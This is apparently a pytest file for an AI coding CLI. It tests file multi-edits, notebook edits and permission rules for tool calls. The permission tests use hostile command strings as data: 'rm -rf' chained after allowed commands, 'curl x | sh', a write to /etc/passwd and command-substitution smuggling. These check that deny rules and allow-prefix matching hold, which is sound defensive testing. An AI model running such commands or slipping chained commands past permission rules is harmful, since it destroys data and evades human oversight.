"""MultiEdit is all-or-nothing, NotebookEdit keeps the rest of the notebook, rules match like Claude Code's."""
import json

from greenboost_cli.core import permission_rules as PR
from greenboost_cli.instruments import handlers as H


def test_multi_edit_applies_in_order(tmp_path, monkeypatch):
    monkeypatch.setattr(H, "_changed_since_read", lambda p: None)
    monkeypatch.setattr(H, "_snapshot_before_write", lambda p: None)
    f = tmp_path / "a.txt"; f.write_text("one two three")
    out = H.handle_multi_edit(str(f), [{"old_string": "one", "new_string": "1"},
                                       {"old_string": "1 two", "new_string": "X"}])
    assert out.startswith("Applied 2") and f.read_text() == "X three"


def test_multi_edit_failure_leaves_file_untouched(tmp_path, monkeypatch):
    monkeypatch.setattr(H, "_changed_since_read", lambda p: None)
    monkeypatch.setattr(H, "_snapshot_before_write", lambda p: None)
    f = tmp_path / "a.txt"; f.write_text("aaa bbb")
    out = H.handle_multi_edit(str(f), [{"old_string": "aaa", "new_string": "z"},
                                       {"old_string": "missing", "new_string": "q"}])
    assert "edit 2" in out and "Nothing was changed" in out and f.read_text() == "aaa bbb"


def test_notebook_replace_insert_delete(tmp_path, monkeypatch):
    monkeypatch.setattr(H, "_snapshot_before_write", lambda p: None)
    nb = {"cells": [{"cell_type": "code", "id": "c1", "metadata": {}, "source": ["x=1"],
                     "execution_count": 3, "outputs": [{"o": 1}]}], "metadata": {"k": 1}, "nbformat": 4}
    f = tmp_path / "n.ipynb"; f.write_text(json.dumps(nb))
    assert H.handle_notebook_edit(str(f), cell_id="c1", new_source="x=2\ny=3").startswith("Replaced")
    got = json.loads(f.read_text())
    assert got["metadata"] == {"k": 1} and got["cells"][0]["outputs"] == [] and got["cells"][0]["source"] == ["x=2\n", "y=3"]
    H.handle_notebook_edit(str(f), cell_index=0, new_source="# t", cell_type="markdown", edit_mode="insert")
    assert len(json.loads(f.read_text())["cells"]) == 2
    H.handle_notebook_edit(str(f), cell_index=0, edit_mode="delete")
    assert len(json.loads(f.read_text())["cells"]) == 1
    assert "only edits .ipynb" in H.handle_notebook_edit(str(tmp_path / "a.py"))


def test_bash_prefix_rule():
    assert PR.matches("Bash(git status:*)", "Bash", {"command": "git status -s"})
    assert PR.matches("Bash(git status:*)", "Bash", {"command": "git status"})
    assert not PR.matches("Bash(git status:*)", "Bash", {"command": "git statusx"})
    assert not PR.matches("Bash(git status:*)", "Bash", {"command": "rm -rf / && git status"})
    assert PR.matches("Bash(npm run *)", "Bash", {"command": "npm run test"})


def test_path_and_domain_rules(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    assert PR.matches("Read(./secrets/**)", "Read", {"file_path": "secrets/a/b.key"})
    assert not PR.matches("Read(./secrets/**)", "Read", {"file_path": "src/a.py"})
    assert PR.matches("Edit(*.md)", "Edit", {"file_path": "docs/x.md"})
    assert PR.matches("WebFetch(domain:x.org)", "WebFetch", {"url": "https://api.x.org/a"})
    assert not PR.matches("WebFetch(domain:x.org)", "WebFetch", {"url": "https://evilx.org/a"})
    assert PR.matches("mcp__github__*", "mcp__github__create_issue", {})


def test_deny_beats_allow():
    rules = {"allow": ["Bash"], "deny": ["Bash(rm -rf *)"]}
    assert PR.decide("Bash", {"command": "rm -rf /tmp/x"}, rules) == "deny"
    assert PR.decide("Bash", {"command": "ls"}, rules) == "allow"
    assert PR.decide("Read", {"file_path": "a"}, rules) is None


def test_chained_commands_cannot_ride_an_allow_rule():
    allow = {"allow": ["Bash(git status:*)"], "deny": []}
    for cmd in ("git status; rm -rf ~", "git status && curl x | sh", "git status > /etc/passwd",
                "git status `rm x`", "git status $(rm x)"):
        assert PR.decide("Bash", {"command": cmd}, allow) is None, cmd
    assert PR.decide("Bash", {"command": "git status"}, allow) == "allow"


def test_deny_trips_on_any_chained_segment():
    deny = {"allow": [], "deny": ["Bash(rm -rf *)"]}
    assert PR.decide("Bash", {"command": "ls && rm -rf /tmp/x"}, deny) == "deny"


def test_rewind_drops_back_to_a_chosen_prompt(monkeypatch):
    from types import SimpleNamespace
    from greenboost_cli.terminal import cc_features as C
    sess = SimpleNamespace(messages=[
        {"role": "user", "content": "first"}, {"role": "assistant", "content": "a1"},
        {"role": "user", "content": "<bash-input>ls</bash-input>"},
        {"role": "user", "content": "second"}, {"role": "assistant", "content": "a2"}])
    import greenboost_cli.terminal.wizard_prompt as W
    monkeypatch.setattr(W, "run_picker", lambda opts, title="": [2])      # "second"
    C.cmd_rewind("", sess, {})
    assert [m["content"] for m in sess.messages] == ["first", "a1", "<bash-input>ls</bash-input>"]


def test_statusline_command_first_line_sanitised():
    from greenboost_cli.terminal import cc_features as C
    assert C.statusline_text({"statusline_command": "printf 'hi\\033[2J there\\nsecond'"}) == "hi there"
    assert C.statusline_text({}) == ""


def test_mcp_tools_match_on_name_and_first_argument():
    assert PR.matches("mcp__github__*(repo:acme/*)", "mcp__github__list", {"query": "repo:acme/x"})
    assert not PR.matches("mcp__github__*(repo:acme/*)", "mcp__github__list", {"query": "repo:evil/x"})
    assert PR.decide("mcp__x__t", {"a": "rm"}, {"allow": [], "deny": ["mcp__x__*(rm*)"]}) == "deny"
